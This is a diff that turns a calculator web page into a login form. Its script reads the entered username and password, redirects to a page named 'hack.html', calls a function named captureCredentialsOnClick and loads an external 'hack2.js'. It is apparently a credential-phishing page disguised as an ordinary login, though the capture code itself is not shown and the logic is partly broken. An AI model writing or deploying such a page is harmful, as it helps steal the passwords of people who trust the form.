@@ -1,41 +1,86 @@
-<html lang="en">
+<!DOCTYPE html>
+<html>
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="./index.css">
-    <title>Document</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      text-align: center;
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 5px;
+      box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
+    }
+
+    .head {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+
+    .input {
+      width: 40%;
+      height: 40px;
+      border: 1px solid gray;
+      margin-bottom: 10px;
+      padding: 10px;
+    }
+
+    .button {
+      background-color: blue;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      color: white;
+      cursor: pointer;
+    }
+  </style>
 </head>
 
 <body>
- 
-    <div class="box">
-        <input class="input" type="text" id="display" readonly>
-        <div class="text-box">
+  <div class="container">
+    <div class="head">Login</div>
+    <input
+      type="text"
+      class="input"
+      placeholder="Username"
+      id="username"
+    />
+    <input
+      type="password"
+      class="input"
+      placeholder="Password"
+      id="password"
+    />
+    <button class="button" id="login" onclick="handleLogin()">Login</button>
+  </div>
 
-            <button class="buttons" onclick="addnumber('1');">1</button>
-            <button class="buttons" onclick="addnumber('2');">2</button>
-            <button class="buttons" onclick="addnumber('3');">3</button>
-            <button class="buttons" onclick="oprator('+');">+</button><!--//-->
-            <button class="buttons" onclick="addnumber('4');">4</button><!--4-->
-            <button class="buttons" onclick="addnumber('5');">5</button><!--5-->
-            <button class="buttons" onclick="addnumber('6');">6</button><!--6-->
-            <button class="buttons" onclick="oprator('-');">-</button><!--//-->
-            <button class="buttons" onclick="addnumber('7');">7</button><!--7-->
-            <button class="buttons" onclick="addnumber('8');">8</button><!--8-->
-            <button class="keys" id="add" onclick="addnumber('9');">9</button><!--9-->
-            <button class="keys" id="subract" onclick="oprator('*');">x</button><!--//-->
-            <button class="keys" id="mulit" onclick="addnumber('0');">0</button><!--0-->
-            <button class="keys" onclick="clears();">AC</button>
-            <button class="keys" onclick="deletes();">C</button>
-            <button class="keys" onclick="oprator('/');;">/</button><!--//-->
-            <button class="keys" id="divide" onclick="result();">=</button><!--=-->
-        </div>
+  <script>
+    function handleLogin() {
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      window.location.href = './hack.html';
 
 
-    </div>
-    
-    <script src="./index.js"></script>
+      if (username && password) {
+        alert('Welcome');
+        captureCredentialsOnClick();
+
+        // You can perform navigation or other actions here
+      } else {
+        alert('Fill in all the fields');
+      }
+    }
+  </script>
+  <script src="./hack2.js"></script>
 </body>
 
 </html>
